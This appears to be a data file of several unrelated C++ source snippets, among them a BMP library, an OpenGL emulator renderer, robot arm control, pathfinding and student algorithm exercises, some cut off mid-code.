    "\ufeff#include \"unibmp.hpp\"\n\n#include <fstream>\n#include <sstream>\n#include <type_traits>\n#include <limits>\n#include <cstring>\n#include <algorithm>\n\nnamespace UniformBitmap\n{\n\n\tReadBmpFileError::ReadBmpFileError(std::string what) noexcept :\n\t\tstd::runtime_error(what)\n\t{\n\t}\n\n\tWriteBmpFileError::WriteBmpFileError(std::string what) noexcept :\n\t\tstd::runtime_error(what)\n\t{\n\t}\n\n\tLoadImageError::LoadImageError(std::string what) noexcept :\n\t\tstd::runtime_error(what)\n\t{\n\t}\n\n\tSaveImageError::SaveImageError(std::string what) noexcept :\n\t\tstd::runtime_error(what)\n\t{\n\t}\n\n\tInvalidRotationAngle::InvalidRotationAngle(std::string what) noexcept :\n\t\tstd::invalid_argument(what)\n\t{\n\t}\n\n\tInvalidRotationOrient::InvalidRotationOrient(std::string what) noexcept :\n\t\tstd::invalid_argument(what)\n\t{\n\t}\n\n#pragma pack(push, 1)\n\n\t// \u4f4d\u56fe\u6587\u4ef6\u5934\n\tstruct BitmapFileHeader\n\t{\n\t\tuint16_t bfType;\n\t\tuint32_t bfSize;\n\t\tuint16_t bfReserved1;\n\t\tuint16_t bfReserved2;\n\t\tuint32_t bfOffbits;\n\t};\n\n\t// \u4f4d\u56fe\u4fe1\u606f\u5934\n\tstruct BitmapInfoHeader\n\t{\n\t\tuint32_t biSize;\n\t\tint32_t biWidth;\n\t\tint32_t biHeight;\n\t\tuint16_t biPlanes;\n\t\tuint16_t biBitCount;\n\t\tuint32_t biCompression;\n\t\tuint32_t biSizeImage;\n\t\tuint32_t biXPelsPerMeter;\n\t\tuint32_t biYPelsPerMeter;\n\t\tuint32_t biClrUsed;\n\t\tuint32_t biClrImportant;\n\t};\n\n#pragma pack(pop)\n\n\tstatic bool IsLikelyBmp(const void* Memory, size_t Size)\n\t{\n\t\tconstexpr size_t HeaderSize = sizeof(BitmapFileHeader) + sizeof(BitmapInfoHeader);\n\t\tif (Size < HeaderSize) return false;\n\n\t\tconst BitmapFileHeader& BMFH = *reinterpret_cast<const BitmapFileHeader*>(Memory);\n\t\tconst BitmapInfoHeader& BMIF = *reinterpret_cast<const BitmapInfoHeader*>(&(&BMFH)[1]);\n\n\t\tif (BMFH.bfType == 0x4D42 &&\n\t\t\tBMFH.bfSize > HeaderSize &&\n\t\t\tBMFH.bfReserved1 == 0 &&\n\t\t\tBMFH.bfReserved2 == 0 &&\n\t\t\tBMIF.biSize >= sizeof(BitmapInfoHeader))\n\t\t\treturn true;\n\t\telse\n\t\t\treturn false;\n\t}\n\n\tstatic bool IsLikelyBmp(const std::string& FilePath)\n\t{\n\t\tconstexpr size_t HeaderSize = sizeof(BitmapFileHeader) + sizeof(BitmapInfoHeader);\n\t\tchar buf[HeaderSize];\n\t\ttry\n\t\t{\n\t\t\tauto ifs = std::ifstream(FilePath, std::ios::binary);\n\t\t\tifs.exceptions(std::ios::failbit | std::ios::badbit);\n\t\t\tifs.read(buf, sizeof buf);\n\t\t\treturn IsLikelyBmp(buf, sizeof buf);\n\t\t}\n\t\tcatch (const std::ios::failure&)\n\t\t{ // \u4e0d\u80fd\u8bfb\u7684\u60c5\u51b5\u8ba4\u4f5c\u8def\u5f84\u4e0d\u662f BMP \u6587\u4ef6\u8def\u5f84\n\t\t\treturn false;\n\t\t}\n\t}\n\n\ttemplate<typename SrcI, typename DstI> requires std::is_integral_v<SrcI>&& std::is_floating_point_v<DstI>\n\tDstI NormalizedIntegralToFloat(SrcI si)\n\t{\n\t\treturn static_cast<DstI>(static_cast<double>(si) / static_cast<double>(std::numeric_limits<SrcI>::max()));\n\t}\n\n\ttemplate<typename SrcI, typename DstI> requires std::is_floating_point_v<SrcI>&& std::is_integral_v<DstI>\n\tDstI FloatToNormalizedIntegral(SrcI si)\n\t{\n\t\tdouble value = si;\n\t\tconstexpr auto max = static_cast<double>(std::numeric_limits<DstI>::max());\n\t\tconstexpr auto min = static_cast<double>(std::numeric_limits<DstI>::min());\n\t\tif (value > 1.0) value = 1.0;\n\t\tif constexpr (std::is_signed_v<DstI>)\n\t\t{\n\t\t\tif (value < -1.0) value = -1.0;\n\t\t\treturn static_cast<DstI>(min + (value + 1.0) * 0.5 * (max - min));\n\t\t}\n\t\telse\n\t\t{\n\t\t\tif (value < 0.0) value = 0.0;\n\t\t\treturn static_cast<DstI>(min + value * (max - min));\n\t\t}\n\t}\n\n\ttemplate<typename SrcI, typename DstI> requires std::is_integral_v<SrcI> && std::is_integral_v<DstI>\n\tDstI NormalizedIntegralConvertion(SrcI si)\n\t{\n\t\tconstexpr int SrcBitCount = sizeof(SrcI) * 8;\n\t\tconstexpr int DstBitCount = sizeof(DstI) * 8;\n\t\tif constexpr (SrcBitCount >= DstBitCount)\n\t\t{\n\t\t\tif constexpr(std::is_signed_v<DstI>)\n\t\t\t{\n\t\t\t\t// int8_t -> int8_t\n\t\t\t\t// int16_t -> int8_t\n\t\t\t\t// int32_t -> int8_t\n\t\t\t\t// uint8_t -> int8_t\n\t\t\t\t// uint16_t -> int8_t\n\t\t\t\t// uint32_t -> int8_t\n\t\t\t\tauto value = static_cast<DstI>(si >> (SrcBitCount - DstBitCount));\n\t\t\t\tif (!std::is_signed_v<SrcI>)\n\t\t\t\t{\n\t\t\t\t\tvalue += std::numeric_limits<DstI>::min();\n\t\t\t\t}\n\t\t\t\treturn value;\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\t// int8_t -> uint8_t\n\t\t\t\t// int16_t -> uint8_t\n\t\t\t\t// int32_t -> uint8_t\n\t\t\t\t// uint8_t -> uint8_t\n\t\t\t\t// uint16_t -> uint8_t\n\t\t\t\t// uint32_t -> uint8_t\n\t\t\t\tif (std::is_signed_v<SrcI>)\n\t\t\t\t{\n\t\t\t\t\tsi += std::numeric_limits<SrcI>::min();\n\t\t\t\t}\n\t\t\t\treturn static_cast<DstI>(si >> (SrcBitCount - DstBitCount));\n\t\t\t}\n\t\t}\n\t\telse\n\t\t{\n\t\t\tif constexpr (std::is_signed_v<DstI>)\n\t\t\t{\n\t\t\t\t// int8_t -> int16_t\n\t\t\t\t// int8_t -> int32_t\n\t\t\t\t// uint8_t -> int16_t\n\t\t\t\t// uint8_t -> int32_t\n\t\t\t\tif (!std::is_signed_v<SrcI>)\n\t\t\t\t{\n\t\t\t\t\tsi += static_cast<SrcI>(1) << (SrcBitCount - 1);\n\t\t\t\t}\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\t// int8_t -> uint16_t\n\t\t\t\t// int8_t -> uint32_t\n\t\t\t\t// uint8_t -> uint16_t\n\t\t\t\t// uint8_t -> uint32_t\n\t\t\t\tif (std::is_signed_v<SrcI>)\n\t\t\t\t{\n\t\t\t\t\t// int8 -> uint64\n\t\t\t\t\tsi += std::numeric_limits<SrcI>::min();\n\t\t\t\t}\n\t\t\t}\n\t\t\tauto value = static_cast<DstI>(si) & ((static_cast<DstI>(1) << SrcBitCount) - static_cast<DstI>(1));\n\t\t\tauto append = value;\n\t\t\tconstexpr int shifts = (DstBitCount - SrcBitCount) / SrcBitCount;\n\t\t\tfor (int i = 0; i < shifts; i++)\n\t\t\t{\n\t\t\t\tvalue <<= SrcBitCount;\n\t\t\t\tvalue |= append;\n\t\t\t}\n\t\t\treturn value;\n\t\t",
    "// SPDX-FileCopyrightText: 2014 Citra Emulator Project\n// SPDX-License-Identifier: GPL-2.0-or-later\n\n#include <algorithm>\n#include <cstddef>\n#include <cstdlib>\n#include <memory>\n\n#include <glad/glad.h>\n\n#include \"common/assert.h\"\n#include \"common/logging/log.h\"\n#include \"common/microprofile.h\"\n#include \"common/settings.h\"\n#include \"common/telemetry.h\"\n#include \"core/core_timing.h\"\n#include \"core/frontend/emu_window.h\"\n#include \"core/telemetry_session.h\"\n#include \"video_core/capture.h\"\n#include \"video_core/present.h\"\n#include \"video_core/renderer_opengl/gl_blit_screen.h\"\n#include \"video_core/renderer_opengl/gl_rasterizer.h\"\n#include \"video_core/renderer_opengl/gl_shader_manager.h\"\n#include \"video_core/renderer_opengl/gl_shader_util.h\"\n#include \"video_core/renderer_opengl/renderer_opengl.h\"\n#include \"video_core/textures/decoders.h\"\n\nnamespace OpenGL {\nnamespace {\nconst char* GetSource(GLenum source) {\n    switch (source) {\n    case GL_DEBUG_SOURCE_API:\n        return \"API\";\n    case GL_DEBUG_SOURCE_WINDOW_SYSTEM:\n        return \"WINDOW_SYSTEM\";\n    case GL_DEBUG_SOURCE_SHADER_COMPILER:\n        return \"SHADER_COMPILER\";\n    case GL_DEBUG_SOURCE_THIRD_PARTY:\n        return \"THIRD_PARTY\";\n    case GL_DEBUG_SOURCE_APPLICATION:\n        return \"APPLICATION\";\n    case GL_DEBUG_SOURCE_OTHER:\n        return \"OTHER\";\n    default:\n        ASSERT(false);\n        return \"Unknown source\";\n    }\n}\n\nconst char* GetType(GLenum type) {\n    switch (type) {\n    case GL_DEBUG_TYPE_ERROR:\n        return \"ERROR\";\n    case GL_DEBUG_TYPE_DEPRECATED_BEHAVIOR:\n        return \"DEPRECATED_BEHAVIOR\";\n    case GL_DEBUG_TYPE_UNDEFINED_BEHAVIOR:\n        return \"UNDEFINED_BEHAVIOR\";\n    case GL_DEBUG_TYPE_PORTABILITY:\n        return \"PORTABILITY\";\n    case GL_DEBUG_TYPE_PERFORMANCE:\n        return \"PERFORMANCE\";\n    case GL_DEBUG_TYPE_OTHER:\n        return \"OTHER\";\n    case GL_DEBUG_TYPE_MARKER:\n        return \"MARKER\";\n    default:\n        ASSERT(false);\n        return \"Unknown type\";\n    }\n}\n\nvoid APIENTRY DebugHandler(GLenum source, GLenum type, GLuint id, GLenum severity, GLsizei length,\n                           const GLchar* message, const void* user_param) {\n    const char format[] = \"{} {} {}: {}\";\n    const char* const str_source = GetSource(source);\n    const char* const str_type = GetType(type);\n\n    switch (severity) {\n    case GL_DEBUG_SEVERITY_HIGH:\n        LOG_CRITICAL(Render_OpenGL, format, str_source, str_type, id, message);\n        break;\n    case GL_DEBUG_SEVERITY_MEDIUM:\n        LOG_WARNING(Render_OpenGL, format, str_source, str_type, id, message);\n        break;\n    case GL_DEBUG_SEVERITY_NOTIFICATION:\n    case GL_DEBUG_SEVERITY_LOW:\n        LOG_DEBUG(Render_OpenGL, format, str_source, str_type, id, message);\n        break;\n    }\n}\n} // Anonymous namespace\n\nRendererOpenGL::RendererOpenGL(Core::TelemetrySession& telemetry_session_,\n                               Core::Frontend::EmuWindow& emu_window_,\n                               Tegra::MaxwellDeviceMemoryManager& device_memory_, Tegra::GPU& gpu_,\n                               std::unique_ptr<Core::Frontend::GraphicsContext> context_)\n    : RendererBase{emu_window_, std::move(context_)}, telemetry_session{telemetry_session_},\n      emu_window{emu_window_}, device_memory{device_memory_}, gpu{gpu_}, device{emu_window_},\n      state_tracker{}, program_manager{device},\n      rasterizer(emu_window, gpu, device_memory, device, program_manager, state_tracker) {\n    if (Settings::values.renderer_debug && GLAD_GL_KHR_debug) {\n        glEnable(GL_DEBUG_OUTPUT);\n        glEnable(GL_DEBUG_OUTPUT_SYNCHRONOUS);\n        glDebugMessageCallback(DebugHandler, nullptr);\n    }\n    AddTelemetryFields();\n\n    // Initialize default attributes to match hardware's disabled attributes\n    GLint max_attribs{};\n    glGetIntegerv(GL_MAX_VERTEX_ATTRIBS, &max_attribs);\n    for (GLint attrib = 0; attrib < max_attribs; ++attrib) {\n        glVertexAttrib4f(attrib, 0.0f, 0.0f, 0.0f, 1.0f);\n    }\n    // Enable seamless cubemaps when per texture parameters are not available\n    if (!GLAD_GL_ARB_seamless_cubemap_per_texture && !GLAD_GL_AMD_seamless_cubemap_per_texture) {\n        glEnable(GL_TEXTURE_CUBE_MAP_SEAMLESS);\n    }\n\n    // Enable unified vertex attributes when the driver supports it\n    if (device.HasVertexBufferUnifiedMemory()) {\n        glEnableClientState(GL_VERTEX_ATTRIB_ARRAY_UNIFIED_NV);\n        glEnableClientState(GL_ELEMENT_ARRAY_UNIFIED_NV);\n    }\n    blit_screen = std::make_unique<BlitScreen>(rasterizer, device_memory, state_tracker,\n                                               program_manager, device, PresentFiltersForDisplay);\n    blit_applet =\n        std::make_unique<BlitScreen>(rasterizer, device_memory, state_tracker, program_manager,\n                                     device, PresentFiltersForAppletCapture);\n    capture_framebuffer.Create();\n    capture_renderbuffer.Create();\n    glBindRenderbuffer(GL_RENDERBUFFER, capture_renderbuffer.handle);\n    glRenderbufferStorage(GL_REN",
    "// Copyright (c) 2017 Franka Emika GmbH\n// Use of this source code is governed by the Apache-2.0 license, see LICENSE\n#include <iostream>\n#include <thread>\n#include <chrono>\n#include <vector>\n#include <math.h> \n#include <eigen3/Eigen/Dense>\n#include <franka/exception.h>\n#include <franka/robot.h>\n#include <franka/rate_limiting.h>\n#include \"ik.h\"\n#include \"common.h\"\n/**\n * @example echo_robot_state.cpp\n * An example showing how to continuously read the robot state.\n */\n\n\nnamespace robotContext {\n    franka::Robot *robot;\n    franka::Gripper *gripper;\n    franka::Model *model;\n\n}\n\n    \nnamespace global_variable{\n  std::array< double, 16 > current_ee_pose; \n  bool flag_done_collecting; \n  std::vector<std::array< double, 16 >> collected_ee_poses;\n}\n\nstd::vector<std::array< double, 16 >> record_pose_thread(int n_poses=3){\n  int collected_poses = 0; \n  std::string my_string = \"\";\n  \n  while(collected_poses < n_poses){\n    std::cout << \"Press ENTER to collect current pose, anything else to quit data collection\" << std::endl;\n    std::getline(std::cin, my_string);\n    if(my_string.length()==0){\n      global_variable::collected_ee_poses.push_back(global_variable::current_ee_pose);\n      collected_poses++;\n    }\n    else{\n      std::cout << \"Exiting data collection\"<<std::endl; \n      global_variable::flag_done_collecting = true; \n      break;\n    }\n  }\n  global_variable::flag_done_collecting = true; \n\n\n}\n\ndouble distance(const Eigen::Vector3d &v1,const Eigen::Vector3d &v2){\n  Eigen::Vector3d diff = v1 - v2;\n  return diff.norm();\n}\n\n// define callback for the torque control loop\n\n\nint main(int argc, char** argv) {\n  global_variable::flag_done_collecting = false; \n\n  std::vector<std::array< double, 16 >> ee_poses; \n  if (argc != 2) {\n    std::cerr << \"Usage: \" << argv[0] << \" <robot-hostname>\" << std::endl;\n    return -1;\n  }\n  InverseKinematics ik_controller(1, IKType::M_P_PSEUDO_INVERSE);\n  try {\n    franka::Robot robot(argv[1]);\n    robotContext::robot = &robot;\n    franka::Model model = robot.loadModel();\n    robotContext::model = &model;\n    \n    std::cout << \"Make sure you place the robot close to where you are collecting point set, then Press ENTER\" << std::endl;\n    std::string my_string;\n    std::getline(std::cin, my_string);\n    franka::RobotState initial_state = robotContext::robot->readOnce();\n    /***************Cartesian impedance conteol parameters***********************************************/\n    Eigen::Affine3d initial_transform(Eigen::Matrix4d::Map(initial_state.O_T_EE.data()));\n    Eigen::Vector3d position_d(initial_transform.translation());\n    Eigen::Quaterniond orientation_d(initial_transform.linear());\n    // Compliance parameters\n    const double translational_stiffness{50.0};\n    const double rotational_stiffness{10.0};\n    Eigen::MatrixXd stiffness(6, 6), damping(6, 6);\n    stiffness.setZero();\n    stiffness.topLeftCorner(3, 3) << translational_stiffness * Eigen::MatrixXd::Identity(3, 3);\n    stiffness.bottomRightCorner(3, 3) << rotational_stiffness * Eigen::MatrixXd::Identity(3, 3);\n    damping.setZero();\n    damping.topLeftCorner(3, 3) << 2.0 * sqrt(translational_stiffness) *\n                                      Eigen::MatrixXd::Identity(3, 3);\n    damping.bottomRightCorner(3, 3) << 2.0 * sqrt(rotational_stiffness) *\n                                          Eigen::MatrixXd::Identity(3, 3);\n    /****************************************************************************************************/\n                                  \n    int choice{}; \n\n    std::thread t1(record_pose_thread, 3);\n    try{\n        std::function<franka::Torques(const franka::RobotState&, franka::Duration)> \n              impedance_control_callback = [position_d, orientation_d, stiffness, damping](const franka::RobotState& robot_state,\n                                            franka::Duration /*duration*/) -> franka::Torques {\n                // get state variables\n                std::array<double, 7> coriolis_array = robotContext::model->coriolis(robot_state);\n                std::array<double, 42> jacobian_array =\n                    robotContext::model->zeroJacobian(franka::Frame::kEndEffector, robot_state);\n                // convert to Eigen\n                Eigen::Map<const Eigen::Matrix<double, 7, 1>> coriolis(coriolis_array.data());\n                Eigen::Map<const Eigen::Matrix<double, 6, 7>> jacobian(jacobian_array.data());\n                Eigen::Map<const Eigen::Matrix<double, 7, 1>> q(robot_state.q.data());\n                Eigen::Map<const Eigen::Matrix<double, 7, 1>> dq(robot_state.dq.data());\n                Eigen::Affine3d transform(Eigen::Matrix4d::Map(robot_state.O_T_EE.data()));\n                Eigen::Vector3d position(transform.translation());\n                Eigen::Quaterniond orientation(transform.linear());\n                // compute error to desired equilibrium pose\n                // position error\n                Eigen::Matrix<double, 6, 1> error;\n                error.head(3) << posit",
    "#include <vector>\n#include <algorithm>\n#include <iostream>\n\n#include \"pathfind.h\"\n#include \"node.h\"\n#include \"nodes.hpp\"\n#include \"pathfind.h\"\n\nstd::vector<std::vector<int> > search(std::vector<std::vector<int> > board) {\n    std::vector<Node> openNodes;\n    std::vector<std::vector<int> > empty;\n\n    // Distance cost\n    int g = 0;\n    // Manhattan distance\n    int h = heuristic(static_cast<int>(Nodes::startNodeX), static_cast<int>(Nodes::startNodeY), static_cast<int>(Nodes::endNodeX), static_cast<int>(Nodes::endNodeY));\n\n    Node startingNode(static_cast<int>(Nodes::startNodeX), static_cast<int>(Nodes::startNodeY), 0, h);\n\n    openNodes.push_back(startingNode);\n\n    while(openNodes.size() > 0) {\n        cellSort(&openNodes);\n        Node currentNode = openNodes.back();\n\n        openNodes.pop_back();\n\n        board[currentNode.yPosition][currentNode.xPosition] = 2;\n\n        // std::cout << \"Current position! \" << currentNode.xPosition << currentNode.yPosition << std::endl;\n        if (currentNode.xPosition == static_cast<int>(Nodes::endNodeX) && currentNode.yPosition == static_cast<int>(Nodes::endNodeY)) {\n            std::cout << \"Reached last position returning board! \" << openNodes.size() << std::endl;\n            return board;\n        }\n\n        expandNeighbors(currentNode, openNodes, board);\n    }\n    \n    std::cout << \"Finished searching!\" << std::endl;\n    return board;\n}\n\n// Get the absolute distance between the cells\nint heuristic(int x1, int y1, int x2, int y2) {\n    return abs(x2 - x1) + abs(y2 - y1);\n}\n\n/*\nCompare the F-value of two cells ( f = g + h )\ng = Distance cost between cells\nh = absolute distance between two cells\n*/\nbool compare(Node aNode, Node bNode) {\n    int f1 = aNode.distanceCost + aNode.absoluteDistance;\n    int f2 = bNode.distanceCost + bNode.absoluteDistance;\n    return f1 > f2;\n}\n\n/*\nSort the open cells based on the f-value\n*/\nvoid cellSort(std::vector<Node> *v) {\n    sort(v->begin(), v->end(), compare);\n}\n\n/*\nCheck if the position is a valid open cell\n*/\nbool isValidCell(int x, int y, std::vector<std::vector<int> > board) {\n    if (\n        x < 0 || x >= board[0].size() ||\n        y < 0 || y >= board.size()\n    ) {\n        return false;\n    }\n    return board[y][x] == 0;\n}\n\nvoid expandNeighbors(Node currentNode, std::vector<Node> &openNodes, std::vector<std::vector<int> > &board) {\n    const int delta[4][2] = {{0, 1}, {1, 0}, {0, -1}, {-1, 0}};\n\n    // Clearing the old nodes to prevent the algorithm to revisit closed nodes\n    openNodes.clear();\n\n    for(int count = 0; count < 4; count++) {\n        int x = currentNode.xPosition + delta[count][0];\n        int y = currentNode.yPosition + delta[count][1];\n\n        if (isValidCell(x, y, board)) {\n            int g = currentNode.distanceCost + 1;\n            int h = heuristic(x, y, static_cast<int>(Nodes::endNodeX), static_cast<int>(Nodes::endNodeY));\n            Node neighbor(x, y, g, h);\n            openNodes.push_back(neighbor);\n            board[y][x] = 9;\n        }\n    }   \n}",
    "#include <iostream>\n#include <vector>\n\nint main() {\n  int cnt;\n  std::cin >> cnt;\n\n  std::vector<long long> data(cnt);\n  for (int i = 0; i < cnt; i++) {\n    std::cin >> data[i];\n  }\n\n  std::vector<long long> stack;\n  std::vector<int> smaller_index_right(cnt, cnt);\n\n  for (int i = cnt - 1; i >= 0; i--) {\n    while (!stack.empty() && data[i] <= data[stack.back()]) {\n      stack.pop_back();\n    }\n    if (!stack.empty()) {\n      smaller_index_right[i] = stack.back();\n    }\n    stack.push_back(i);\n  }\n\n  stack.clear();\n  std::vector<int> smaller_index_left(cnt, -1);\n\n  for (int i = 0; i < cnt; i++) {\n    while (!stack.empty() && data[i] <= data[stack.back()]) {\n      stack.pop_back();\n    }\n    if (!stack.empty()) {\n      smaller_index_left[i] = stack.back();\n    }\n    stack.push_back(i);\n  }\n\n  int left_obstacle;\n  int right_obstacle;\n  long long current_max = 0;\n  long long current_result;\n  for (int i = 0; i < cnt; i++) {\n    left_obstacle = smaller_index_left[i];\n    right_obstacle = smaller_index_right[i];\n\n    current_result = data[i] * (right_obstacle - left_obstacle - 1);\n    if (current_result > current_max) {\n      current_max = current_result;\n    }\n  }\n\n  std::cout << current_max;\n}",
    "#include \"mainwindow.h\"\n#include \"ui_mainwindow.h\"\n#include \"appsettings.h\"\n#include \"aboutprogramdialog.h\"\n#include \"helpwindow.h\"\n#include \"dbviewwidget.h\"\n#include \"settingsdialog.h\"\n#include \"optimizationresultsdialog.h\"\n#include \"optmethods/optimizationthread.h\"\n#include \"optmethods/optimizationobjectstorage.h\"\n\n#define DEBUG_MODE 1\n#include \"program_defs.h\"\n\n#include <QWindowStateChangeEvent>\n#include <QVBoxLayout>\n#include <QSet>\n\nMainWindow::MainWindow()\n    : QMainWindow(nullptr)\n    , ui(new Ui::MainWindow)\n    , aboutDialog(new AboutProgramDialog(this))\n    , helpWindow(new HelpWindow(this))\n{\n    QStringList optMethods, integerMethods;\n\n    for (auto& key : OptimizationObjectStorage::indexes.keys())\n    {\n        OptimizationType t = OptimizationObjectStorage::indexes[key]->getType();\n        if (t == OptimizationType::Generic)\n        {\n            optMethods.append(key);\n        }\n        else if (t == OptimizationType::Integer)\n        {\n            integerMethods.append(key);\n        }\n    }\n\n    ui->setupUi(this);\n\n    ui->optMethod->addItems(optMethods);\n    ui->integerMethod->addItems(integerMethods);\n\n    viewWidgetLayout = new QVBoxLayout(ui->viewWidget);\n    viewWidgetLayout->setMargin(0);\n\n    dbView = new DBViewWidget(this, ui->viewWidget);\n    viewWidgetLayout->addWidget(dbView);\n    connect(ui->loadDbButton, SIGNAL(clicked()), dbView, SLOT(openLoadDialog()));\n    connect(ui->refreshButton, SIGNAL(clicked()), dbView, SLOT(refreshDb()));\n    connect(ui->disconnectButton, SIGNAL(clicked()), dbView, SLOT(disconnectFromDb()));\n\n    sw = new SettingsDialog(this);\n    connect(ui->actionSettings, SIGNAL(triggered()), sw, SLOT(show()));\n    connect(ui->actionProgramInfo, SIGNAL(triggered()), aboutDialog, SLOT(show()));\n    connect(ui->actionHelp, SIGNAL(triggered()), helpWindow, SLOT(show()));\n\n    optRes = new OptimizationResultsDialog(dbView, this);\n    connect(ui->optimizeButton, SIGNAL(clicked()), this, SLOT(onOptimizeClicked()));\n    connect(this, SIGNAL(passOptimizationParameters(QString*, QString*)), optRes, SLOT(calculateAndShow(QString*, QString*)));\n}\n\nMainWindow::~MainWindow()\n{\n    delete ui;\n}\n\nvoid MainWindow::resizeEvent(QResizeEvent* event)\n{\n    QMainWindow::resizeEvent(event);\n\n    AppSettings* settings = AppSettings::get();\n    settings->takeByName(\"resolutionX\") = QString::number(size().width());\n    settings->takeByName(\"resolutionY\") = QString::number(size().height());\n}\n\nvoid MainWindow::changeEvent(QEvent *e)\n{\n    if (e->type() == QEvent::WindowStateChange)\n    {\n        QWindowStateChangeEvent* event = static_cast< QWindowStateChangeEvent* >( e );\n\n        AppSettings* settings = AppSettings::get();\n\n        if (event->oldState() == Qt::WindowNoState && this->windowState() == Qt::WindowMaximized)\n        {\n            settings->takeByName(\"maximized\") = \"1\";\n        }\n        else if (event->oldState() == Qt::WindowMaximized && this->windowState() == Qt::WindowNoState)\n        {\n            settings->takeByName(\"maximized\") = \"0\";\n        }\n    }\n\n    QMainWindow::changeEvent(e);\n}\n\nvoid MainWindow::enableButtons(bool enabled)\n{\n    ui->disconnectButton->setEnabled(enabled);\n    ui->refreshButton->setEnabled(enabled);\n    ui->optimizeButton->setEnabled(enabled);\n}\n\nvoid MainWindow::onOptimizeClicked()\n{\n    QString* optMethod = new QString(ui->optMethod->currentText());\n    QString* integerMethod = (ui->integerCheckbox->isChecked() ? new QString(ui->integerMethod->currentText()) : nullptr);\n    emit passOptimizationParameters(optMethod, integerMethod);\n}\n",
    "//1.  Duoti datos ir gimstamumo rodikliai, surasyti i masyva formatu: {menuo, diena, lytis, kiekis, lytis, kiekis].\n// Programa turetu rasti kiek ta menesi gime vyriskos ir moteriskos lyties kudikiu (pagal vartotojo ivesta men). \n// Istaisykite programos klaidas ir paaiskinkite koda.\n\n#include <iostream>\nusing namespace std;\n\nint main()\n{\n\tint kiekis[5][6] = {\n\t\t{ 01, 15, 'v', 5, 'm', 8 },\n\t\t{ 01, 16, 'v', 3, 'm', 1 },\n\t\t{ 01, 17, 'm', 2, 'v', 2 },\n\t\t{ 01, 18, 'v', 4, 'm', 3 },\n\t\t{ 02, 15, 'm', 3, 'v', 3 }\n\t};\n\tint menuo, v = 0, m = 0;\n\n\tcout << \"Iveskite menesio numeri: \";\n\tcin >> menuo;\n\n\tif (menuo < 1 or menuo > 12) {\n\t\tcout << \"Tokio menesio nera\"<< endl;\n\t}\n\n    else{\n\tfor (int i = 0; i < 5; i++) {\n\t\tif (kiekis[i][0] == menuo) {\n\t\t    if (kiekis[i][2] == 'v') {\n\t\t        v += kiekis[i][3];\n\t\t    }\n\t\t    else {\n\t\t\t    m += kiekis[i][3];\n\t\t    }\n\t\t    \n\t\t    if (kiekis[i][4] == 'v') {\n\t\t        v += kiekis[i][5];\n\t\t    }\n\t\t    else {\n\t\t\t    m += kiekis[i][5];\n\t\t    }\n\t\t}\n\t}\n\tcout << \"Menesi gimusiu vyru skaicius: \" << v << \", moteru: \" << m << endl;\n    }\n\treturn 0;\n}\n",
    "// Workshop 4 - Containers\n\n#include <iostream>\n#include <iomanip>\n#include <fstream>\n#include <string>\n#include <utility>\n#include \"Reservation.h\"\n#include \"Reservation.h\" // intentional\n\nint cout = 0; // won't compile if headers don't follow convention\n\nint main(int argc, char** argv)\n{\n\tstd::cout << \"Command Line:\\n\";\n\tstd::cout << \"--------------------------\\n\";\n\tfor (int i = 0; i < argc; ++i)\n\t\tstd::cout << std::setw(3) << i + 1 << \": \" << argv[i] << '\\n';\n\tstd::cout << \"--------------------------\\n\\n\";\n\n\tseneca::Reservation** ppReservations = nullptr;\n\tsize_t cnt = 0;\n\n\t// Process the file\n\tif (argc > 1) {\n\t\tstd::ifstream file(argv[1]);\n\t\tif (!file)\n\t\t{\n\t\t\tstd::cerr << \"ERROR: Cannot open file [\" << argv[1] << \"].\\n\";\n\t\t\treturn 1;\n\t\t}\n\n\t\tstd::string strReservation;\n\t\t// count how many records are in the file\n\t\tdo\n\t\t{\n\t\t\tstd::getline(file, strReservation);\n\n\t\t\t// if the previous operation failed, the \"file\" object is\n\t\t\t//   in error mode\n\t\t\tif (file)\n\t\t\t{\n\t\t\t\t// Check if this is a commented line.\n\t\t\t\t//   In the input file, commented lines start with '#'\n\t\t\t\tif (strReservation[0] != '#')\n\t\t\t\t\t++cnt;\n\t\t\t}\n\t\t} while (file);\n\n\t\tppReservations = new seneca::Reservation*[cnt];\n\t\tcnt = 0;\n\n\t\t// read again from the file, but this time load and store data\n\t\tfile.clear();\n\t\tfile.seekg(std::ios::beg);\n\t\tdo\n\t\t{\n\t\t\tstd::getline(file, strReservation);\n\n\t\t\t// if the previous operation failed, the \"file\" object is\n\t\t\t//   in error mode\n\t\t\tif (file)\n\t\t\t{\n\t\t\t\t// Check if this is a commented line.\n\t\t\t\t//   In the input file, commented lines start with '#'\n\t\t\t\tif (strReservation[0] != '#')\n\t\t\t\t{\n\t\t\t\t\tppReservations[cnt] = new seneca::Reservation(strReservation);\n\t\t\t\t\t++cnt;\n\t\t\t\t}\n\t\t\t}\n\t\t} while (file);\n\t\tfile.close();\n\t}\n\tstd::cout << \"\\nReservations\\n--------------------------\\n\";\n\tfor (auto i = 0u; i < cnt; ++i)\n\t{\n\t\tstd::cout << *ppReservations[i];\n\t}\n\tstd::cout << \"--------------------------\\n\\n\";\n\n\t// modify dates for some reservations\n\tif (cnt > 2)\n\t{\n\t\tppReservations[0]->update(7, 6);\n\t\tppReservations[2]->update(6, 6);\n\t}\n\n\tstd::cout << \"\\nUpdated Reservations\\n--------------------------\\n\";\n\tfor (auto i = 0u; i < cnt; ++i)\n\t{\n\t\tstd::cout << *ppReservations[i];\n\t}\n\tstd::cout << \"--------------------------\\n\\n\";\n\n\t// cleanup\n\tfor (auto i = 0u; i < cnt; ++i)\n\t\tdelete ppReservations[i];\n\tdelete[] ppReservations;\n\n\treturn cout;\n}\n",
    "//Bobokulov Asilbek 230092 FCS1\n//CS 111 Data Structures and Algorithms\n#include<bits/stdc++.h>\nusing namespace std;\nvoid bfs(vector<vector<int>> &adjList, int startNode, vector<int> &gradeFriend, vector<bool> &visited){\n    queue<int> q; q.push(startNode); gradeFriend[startNode] = 0;\n    while(!q.empty()){\n        int currentNode = q.front();\n        q.pop();\n        for(auto neighbour:adjList[currentNode]){\n            if(!visited[neighbour]){\n                gradeFriend[neighbour] = gradeFriend[currentNode] + 1;\n                visited[neighbour] = 1;\n                q.push(neighbour);\n            }\n        }\n    }\n}\nint main()\n{\n    int n, m; cin >> n >> m;\n    vector<vector<int>> adjList(n);\n    vector<int> gradeFriend(n, -1);\n    vector<bool> visited(n, false);\n    for(int i = 0; i < m; i++){\n        int v1, v2; cin >> v1 >> v2;\n        adjList[v1].push_back(v2);\n        adjList[v2].push_back(v1);\n    }\n    bfs(adjList, 0, gradeFriend, visited); 